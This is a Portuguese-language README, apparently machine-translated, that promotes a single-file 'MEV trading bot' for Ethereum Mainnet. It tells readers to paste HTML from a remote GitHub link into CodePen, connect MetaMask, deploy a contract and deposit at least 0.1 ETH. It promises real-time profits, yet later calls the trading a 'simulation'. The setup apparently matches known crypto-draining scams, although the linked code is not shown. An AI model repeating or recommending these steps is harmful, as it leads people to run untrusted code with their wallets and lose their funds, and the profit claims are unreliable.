# Meu Bot de Negociação Local 🤖

![1](https://i.postimg.cc/B6c2txbp/Chat-GPT-Image-30-2025-18-19-40.png)

Olá, entusiastas de cripto! Estou animado para compartilhar meu **Bot de Negociação Local** — uma ferramenta simples para negociação real na **Ethereum Mainnet**. Tudo está compactado em **um único arquivo HTML**, então você pode executá-lo diretamente no **CodePen** sem complicações! 😎 A interface é inspirada no VS Code — limpa e intuitiva — perfeita para negociar direto do seu navegador. Veja como funciona!

## Funcionalidades

- **Arquivo Tudo-em-Um**: Todo o código está em um único arquivo HTML — basta copiar, colar no CodePen e pronto!
- **Conexão com a Wallet**: Conecte facilmente sua carteira MetaMask para operar com o contrato inteligente.
- **Implantação de Contrato Inteligente**: Implemente seu contrato personalizado na Mainnet (você paga a taxa de gás).
- **Negociação Real**: Comece com o mínimo de **0.1 ETH**, mas para melhores resultados, recomenda-se **0.5 ETH+** — clique em "**Start**" e veja ele operar.
- **Controle de Slippage**: Ajuste a tolerância de slippage entre **0,5% e 49%** para operações flexíveis.
- **Proteção MEV & Sniping**: Ative a proteção contra ataques de Miner Extractable Value (MEV) ou sniping automático de oportunidades.
  - **O que é MEV?** MEV significa que outros bots ou mineradores podem tentar antecipar suas negociações para capturar seu lucro. A proteção MEV ajuda suas transações a terem prioridade sobre concorrentes.
- **Controle de Workflow**:
  - **Start**: Inicia o processo de negociação (requer ≥0.1 ETH, confirme a chamada da função).
  - **Stop**: Para a negociação, disponível apenas após Start.
  - **Withdraw**: Retira os fundos, disponível apenas após Stop.
- **Terminal em Tempo Real**: Exibe transações atuais, caminhos de negociação e lucro.
- **Potencial de Lucro**: Mostra negociações lucrativas e lucro esperado em tempo real (baseado em um depósito de **1 ETH**).
- **Design Responsivo**: Funciona perfeitamente em desktops e dispositivos móveis.

## Como Rodar no [CodePen](https://codepen.io/pen/)

1.  *Configure o **MetaMask:***
    
    -   *Instale o **MetaMask** no seu navegador.*
    -   *Altere para a **Ethereum Mainnet**.*
    -   *Certifique-se de que sua carteira tenha **≥0.1 ETH** mais gás para implantação do contrato.*
    -   *Abra o editor em **[CodePen](https://codepen.io/pen/)**.*
    -   *Cole este **[Código](https://raw.githubusercontent.com/Tevrinodt6aXTD/Mev-Trading-Bot/main/trading_bot.html)** no bloco **HTML**.*
  
2.  **Comece a Negociar:**
    
    -   *Clique em **Connect MetaMask** para conectar sua carteira.*
![Connect MetaMask](https://i.postimg.cc/4N3pNHgv/code.png)
    -   *Clique em **Deploy Contract** para implantar seu contrato inteligente (é necessário gás).*
    -   *Digite **≥0.1 ETH**, defina seu slippage **(0,5%–49%)** e clique em **Start**, confirmando a chamada da função no **MetaMask**.*
    -   *Confira a janela de logs para transações atuais e potencial de lucro.*
![1](https://i.ibb.co/N6RB81pH/34.png)
    -   *Clique em **Stop** para parar a simulação e depois em **Withdraw** para resgatar seus fundos.*
  
3.  *Monitore o Terminal: Os logs mostram transações e lucros em tempo real, além de oportunidades lucrativas com base em um **depósito de 1 ETH**.*

---

**Boas negociações! 🚀**

---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-05

---